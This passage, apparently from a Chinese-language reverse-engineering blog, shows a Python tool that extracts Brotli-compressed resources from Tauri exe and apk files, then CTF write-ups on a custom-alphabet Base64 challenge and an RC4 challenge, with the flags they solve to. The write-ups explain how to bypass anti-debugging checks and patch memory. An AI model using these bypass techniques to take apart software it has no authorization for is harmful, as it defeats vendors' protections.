class="number">0</span>, </span></span><br><span class="line"><span class="params">                    output_file: <span class="built_in">str</span> = <span class="literal">None</span>, save_extracted: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    处理十六进制文件</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file_path: 输入文件路径</span></span><br><span class="line"><span class="string">        head_offset: 头部偏移</span></span><br><span class="line"><span class="string">        tail_offset: 尾部偏移</span></span><br><span class="line"><span class="string">        output_file: 输出文件路径</span></span><br><span class="line"><span class="string">        save_extracted: 是否保存提取的brotli原始数据</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        bool: 是否成功</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取文件: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检测文件类型并读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 先尝试按文本文件读取</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查是否为十六进制文本</span></span><br><span class="line">            sample = content.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[:<span class="number">100</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> sample):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;检测到十六进制文本文件&quot;</span>)</span><br><span class="line">                data = hex_to_bytes(content)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;不是十六进制文本&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> (UnicodeDecodeError, ValueError):</span><br><span class="line">            <span class="comment"># 按二进制文件读取</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;检测到二进制文件&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;数据大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;头部偏移: <span class="subst">&#123;head_offset&#125;</span> 字节&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尾部偏移: <span class="subst">&#123;tail_offset&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查找brotli数据</span></span><br><span class="line">        result = find_brotli_data(data, head_offset, tail_offset)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        decompressed_data, start_pos, end_pos = result</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置输出文件名</span></span><br><span class="line">        <span class="keyword">if</span> output_file <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base_name = os.path.splitext(file_path)[<span class="number">0</span>]</span><br><span class="line">            output_file = <span class="string">f&quot;<span class="subst">&#123;base_name&#125;</span>_decompressed.dat&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存解压数据</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decompressed_data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压数据已保存到: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果需要，保存提取的原始brotli数据</span></span><br><span class="line">        <span class="keyword">if</span> save_extracted:</span><br><span class="line">            extracted_file = <span class="string">f&quot;<span class="subst">&#123;os.path.splitext(output_file)[<span class="number">0</span>]&#125;</span>_brotli.br&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(extracted_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data[start_pos:end_pos])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;原始brotli数据已保存到: <span class="subst">&#123;extracted_file&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显示内容预览</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n解压内容预览:&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 尝试作为文本显示</span></span><br><span class="line">            text_preview = decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)[:<span class="number">500</span>]</span><br><span class="line">            <span class="built_in">print</span>(text_preview)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">500</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;... (内容截断)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="comment"># 显示十六进制</span></span><br><span class="line">            hex_preview = decompressed_data[:<span class="number">100</span>].<span class="built_in">hex</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;十六进制: <span class="subst">&#123;hex_preview&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;... (内容截断)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;从十六进制或二进制文件中提取并解压brotli数据&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用示例:</span></span><br><span class="line"><span class="string">  # 基本用法</span></span><br><span class="line"><span class="string">  python brotli_hex_decoder.py data.hex</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # 指定偏移量</span></span><br><span class="line"><span class="string">  python brotli_hex_decoder.py data.hex --head-offset 10 --tail-offset 5</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # 指定输出文件并保存原始数据</span></span><br><span class="line"><span class="string">  python brotli_hex_decoder.py data.hex -o output.txt --save-extracted</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # 处理二进制文件</span></span><br><span class="line"><span class="string">  python brotli_hex_decoder.py data.bin --head-offset 100</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;input_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入文件路径（十六进制文本或二进制文件）&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--head-offset&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;从文件开头跳过的字节数 (默认: 0)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--tail-offset&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;从文件结尾跳过的字节数 (默认: 0)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;输出文件路径 (默认: &#123;input&#125;_decompressed.dat)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--save-extracted&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;保存提取的原始brotli数据&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--verbose&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;显示详细信息&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.verbose:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;输入文件: <span class="subst">&#123;args.input_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;头部偏移: <span class="subst">&#123;args.head_offset&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;尾部偏移: <span class="subst">&#123;args.tail_offset&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;输出文件: <span class="subst">&#123;args.output <span class="keyword">or</span> <span class="string">&#x27;自动生成&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;保存原始数据: <span class="subst">&#123;args.save_extracted&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    success = process_hex_file(</span><br><span class="line">        args.input_file,</span><br><span class="line">        args.head_offset,</span><br><span class="line">        args.tail_offset,</span><br><span class="line">        args.output,</span><br><span class="line">        args.save_extracted</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    sys.exit(<span class="number">0</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>仍然是复制大概整个图片部分，然后保存到一个文件，直接运行脚本跑一下：</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919140805643.png" alt="image-20250919140805643"></p>
<p>从文件头来看，应该就是一个png文件了</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919140841391.png" alt="image-20250919140841391"></p>
<h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p>这里的apk拿之前写的一个统计工作量的小软件说一下</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920221246632.png" alt="image-20250920221246632" style="zoom:50%;">

<p>其实这种h5的apk主要就是看他的html代码，所以还是找他的这些资源文件的存放位置</p>
<h3 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h3><p>根据之前的exe分析，在apk中应该也是用了brotli压缩，那么跟exe应该很像，保存在一个充斥着二进制的地方，所以不禁联想到<code>.so</code>文件</p>
<p>首先找一下程序的入口页面</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920221632867.png" alt="image-20250920221632867"></p>
<p>能直接找到tauri.conf.json这个源文件</p>
<p>然后找一个<code>.so</code>文件，进去直接搜<code>index.html</code></p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920221704550.png" alt="image-20250920221704550" style="zoom:67%;">

<p>能找到这个地方：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920221820425.png" alt="image-20250920221820425" style="zoom:67%;">

<p>brotli压缩格式貌似没有什么特殊的魔数，一般就是会出现<code>xB</code>这么个格式，1B、5B都见过，所以感觉就是这里，往下翻翻，到这儿应该就结束了</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920221959707.png" alt="image-20250920221959707" style="zoom:67%;">

<p>然后把这一块复制出来</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920222048085.png" alt="image-20250920222048085" style="zoom:50%;">

<p>还是用之前的脚本跑一下：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250920222139181.png" alt="image-20250920222139181" style="zoom:67%;">

<p>也是非常简单的</p>
]]></content>
  </entry>
  <entry>
    <title>常见算法逆向</title>
    <url>/2024/09/25/algorithm/</url>
    <content><![CDATA[<h1 id="常见算法逆向"><a href="#常见算法逆向" class="headerlink" title="常见算法逆向"></a>常见算法逆向</h1><span id="more"></span>

<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><h3 id="Base64加解密"><a href="#Base64加解密" class="headerlink" title="Base64加解密"></a>Base64加解密</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 将要加密的字符串变成二进制</span><br><span class="line">2. 二进制重新分组</span><br><span class="line">3. 分组后二进制转十进制</span><br><span class="line">4. 根据十进制查base64编码表</span><br></pre></td></tr></table></figure>

<img src="/2024/09/25/algorithm/image-20240925101744872.png" alt="image-20240925101744872" style="zoom:50%;">

<p>加密步骤</p>
<p><img src="/2024/09/25/algorithm/image-20240925101933086.png" alt="image-20240925101933086"></p>
<p>空缺时会有一个补零操作</p>
<p><img src="/2024/09/25/algorithm/image-20240925103600426.png" alt="image-20240925103600426"></p>
<h3 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h3><p>base64加密时一般会改base64编码表</p>
<p>比如本来的编码表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">origin = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br></pre></td></tr></table></figure>

<p>更改后的编码表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base = <span class="string">&#x27;aUiBDdopSQVOFlfLnTNrv4sj+MJW3g2Cy5IZk6APYt9RGwqm/8H7eKcx1EzbX0hu&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用更改的编码表进行解码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">origin = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;aUiBDdopSQVOFlfLnTNrv4sj+MJW3g2Cy5IZk6APYt9RGwqm/8H7eKcx1EzbX0hu&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;r6lrnKTo27T5FsDxfB+ElZMIlBQZMAS/MB6AlB4klBnelZFeFrTACn==&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(base, origin)</span><br><span class="line">m = <span class="built_in">str</span>(base64.b64decode(c.translate(table)), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p>表一般会在程序运行的时候改掉，比如下面的例子</p>
<h3 id="题目-easybase-exe"><a href="#题目-easybase-exe" class="headerlink" title="题目 easybase.exe"></a>题目 easybase.exe</h3><p style="display: flex; justify-content: center">
<a href="https://gitee.com/zzzzzyg/exe/raw/master/easybase.exe"><img style="scale: 0.5" src="/2024/09/25/algorithm/image-20240925103838189.png" alt="点击下载easybase.exe"></a>
</p>
#### IDA 分析

<img src="/2024/09/25/algorithm/image-20240925104938767.png" alt="image-20240925104938767" style="zoom:67%;">

<p>找到main函数，分析程序逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打印提示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;plz_input_your_flag: &quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可能跟调试相关</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给字符串Str1加密</span></span><br><span class="line">Str1 = (<span class="type">char</span> *)base64_encode(v4, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断输入的字符串加密后是否与已知加密字符串相同</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, <span class="string">&quot;r6lrnKTo27T5FsDxfB+ElZMIlBQZMAS/MB6AlB4klBnelZFeFrTACn==&quot;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;try_again!&quot;</span>);</span><br></pre></td></tr></table></figure>

<img src="/2024/09/25/algorithm/image-20240925105452256.png" alt="image-20240925105452256" style="zoom:67%;">

<p>直接拿去解码是乱码，所以判断应该改了表</p>
<p>先进到base64_encode函数中查看加密逻辑：</p>
<img src="/2024/09/25/algorithm/image-20240925105540632.png" alt="image-20240925105540632" style="zoom:67%;">

<img src="/2024/09/25/algorithm/image-20240925105633185.png" alt="image-20240925105633185" style="zoom:67%;">

<p>在这里没有发现有什么改表操作，是一个常规的base64加密方法</p>
<p>那问题应该在<code>debug()</code>函数</p>
<img src="/2024/09/25/algorithm/image-20240925105753443.png" alt="image-20240925105753443" style="zoom:67%;">

<p>在<code>debug()</code>函数中，最后返回的时候有一个<code>random_shuffle()</code>函数，参数传进了base64编码表，应该是使用随机数种子打乱了编码表。如果程序正常执行不调试，那么随机数种子为0，如果程序在调试模式中运行，那么随机数种子会被设置成114514</p>
<p>所以动态调试的时候跳过<code>IsDebuggerPresent()</code>函数即可，使用随机数种子0获取到打乱后的表，在进行解密就可以了</p>
<h4 id="x64dbg动态调试"><a href="#x64dbg动态调试" class="headerlink" title="x64dbg动态调试"></a>x64dbg动态调试</h4><p>感觉x64dbg动态比IDA好用</p>
<p><img src="/2024/09/25/algorithm/image-20240925110900782.png" alt="image-20240925110900782"></p>
<p>可以使用IDA快速定位到<code>debug()</code>函数，（主要分析在右侧注释）</p>
<p>在第一个断点处，将ZF位标位1，跳过<code>Seed = 114514</code>，这样就得到了非调试模式下的base64表，表就应该在0x40F020这段内存中</p>
<p><img src="/2024/09/25/algorithm/image-20240925110954237.png" alt="image-20240925110954237"></p>
<img src="/2024/09/25/algorithm/image-20240925111048524.png" alt="image-20240925111048524" style="zoom:67%;">

<p>这一段就是修改后的base64编码表，编写一下一段py进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">origin = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;aUiBDdopSQVOFlfLnTNrv4sj+MJW3g2Cy5IZk6APYt9RGwqm/8H7eKcx1EzbX0hu&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;r6lrnKTo27T5FsDxfB+ElZMIlBQZMAS/MB6AlB4klBnelZFeFrTACn==&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(base, origin)</span><br><span class="line">m = <span class="built_in">str</span>(base64.b64decode(c.translate(table)), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p style="display: flex; justify-content: center;">
<text>解出：</text><img src="/2024/09/25/algorithm/image-20240925111238482.png" alt="image-20240925111238482" style="zoom:50%;">
</p>

<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><h3 id="RC4加解密"><a href="#RC4加解密" class="headerlink" title="RC4加解密"></a>RC4加解密</h3><p>RC4是对称加密算法，加解密使用同一套秘钥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6273)</span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RC4_KEY</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> S_Box[<span class="number">256</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> T_Box[<span class="number">256</span>];</span><br><span class="line">&#125; RC4_KEY, * PRC4_KEY;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4Init</span><span class="params">(PRC4_KEY Context, <span class="type">unsigned</span> <span class="type">char</span>* Key, <span class="type">int</span> KeyLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> v1;</span><br><span class="line">	<span class="keyword">if</span> (Context == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Context-&gt;S_Box[i] = i;</span><br><span class="line">		Context-&gt;T_Box[i] = Key[i % KeyLength];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + Context-&gt;S_Box[i] + Context-&gt;T_Box[i]) % <span class="number">256</span>;</span><br><span class="line">		v1 = Context-&gt;S_Box[i];</span><br><span class="line">		Context-&gt;S_Box[i] = Context-&gt;S_Box[j];</span><br><span class="line">		Context-&gt;S_Box[j] = v1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Input, <span class="type">unsigned</span> <span class="type">int</span> InputLength, <span class="type">unsigned</span> <span class="type">char</span>* Key, <span class="type">unsigned</span> <span class="type">int</span> KeyLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> v1 = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> v2;</span><br><span class="line"></span><br><span class="line">	RC4_KEY Context;</span><br><span class="line">	RC4Init(&amp;Context, Key, KeyLength);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 核心算法</span></span><br><span class="line">	<span class="keyword">for</span> (v1 = <span class="number">0</span>; v1 &lt; InputLength; v1++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		j = (j + Context.S_Box[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 交换S盒</span></span><br><span class="line">		v2 = Context.S_Box[i]; </span><br><span class="line">		Context.S_Box[i] = Context.S_Box[j];</span><br><span class="line">		Context.S_Box[j] = v2;</span><br><span class="line"></span><br><span class="line">		t = (Context.S_Box[i] + Context.S_Box[j]) % <span class="number">256</span>;</span><br><span class="line">		Input[v1] ^= Context.S_Box[t];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4UpdateString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Input[], <span class="type">unsigned</span> <span class="type">int</span> InputLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Key&quot;</span>;</span><br><span class="line">	RC4Crypt(Input, InputLength, Key, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)Key));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> v1[] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Before encryption: %s\n&quot;</span>, v1);</span><br><span class="line">	RC4UpdateString((<span class="type">unsigned</span> <span class="type">char</span>*)v1, <span class="built_in">strlen</span>(v1));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After encryption: %x\n&quot;</span>, v1);</span><br><span class="line">	RC4UpdateString((<span class="type">unsigned</span> <span class="type">char</span>*)v1, <span class="built_in">strlen</span>(v1));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After decryption: %s\n&quot;</span>, v1);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目TCR0-exe"><a href="#题目TCR0-exe" class="headerlink" title="题目TCR0.exe"></a>题目TCR0.exe</h3><img src="/2024/09/25/algorithm/image-20241020102114533.png" alt="image-20241020102114533" style="zoom:67%;">

<p>查一下壳</p>
<p><img src="/2024/09/25/algorithm/image-20241020102202897.png" alt="image-20241020102202897"></p>
<p>IDA看一下主要逻辑</p>
<p><img src="/2024/09/25/algorithm/image-20241020102242918.png" alt="image-20241020102242918"></p>
<p>直接动调拿出解密之后的flag</p>
<p>调试的时候发现没法调试，应该是有反调试，找main函数里面没有IsDebuggerPresent，猜测可能是使用TlsCallback，</p>
<p><img src="/2024/09/25/algorithm/image-20241020102422249.png" alt="image-20241020102422249"></p>
<p>在最下面跳转的语句下一个断点，运行到这里先修改一下ZF标志位</p>
<p>分析一下主函数，v10应该是用户输入的flag，大小为40字节，所以先给input一个40位的输入，过后直接改这40位就好了</p>
<p>v8数组应该是秘钥，这里的密钥加载到内存中，使用小端存储，所以排列起来应该是从右到左，一个字节一个字节来（先转成Hex）</p>
<p>密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">71 0b 02 49 73 b4 e1 a3 2f 58 71 85 16 67 b3 ab</span><br><span class="line">1a cf 62 4f 1e 7d 3b 6c 55 58 15 b9 69 36 7e c0</span><br><span class="line">b8 f4 02 42 03 c2 7f 56</span><br></pre></td></tr></table></figure>



<p><img src="/2024/09/25/algorithm/image-20241020102723472.png" alt="image-20241020102723472"></p>
<p>main函数的断点下在加解密之前，第24行</p>
<p><img src="/2024/09/25/algorithm/image-20241020103305806.png" alt="image-20241020103305806"></p>
<p>查看v10里面存储了40个<code>&#39;a&#39;</code></p>
<p><img src="/2024/09/25/algorithm/image-20241020103345676.png" alt="image-20241020103345676"></p>
<p>使用patch修改这一块的密钥，注意最后一段不要全覆盖掉，只改<code>DWORD64</code>大小的数据</p>
<p><img src="/2024/09/25/algorithm/image-20241020103528109.png" alt="image-20241020103528109"></p>
<p>程序过到加密之后，再查看v10</p>
<p><img src="/2024/09/25/algorithm/image-20241020103700579.png" alt="image-20241020103700579"></p>
<p>按A键转成字符串就出来了</p>
<p><img src="/2024/09/25/algorithm/image-20241020103733505.png" alt="image-20241020103733505"></p>
<p>Flag：<code>NSSCTF&#123;75025d7f6c9f2fbcf746228b4f3d623a&#125;</code></p>
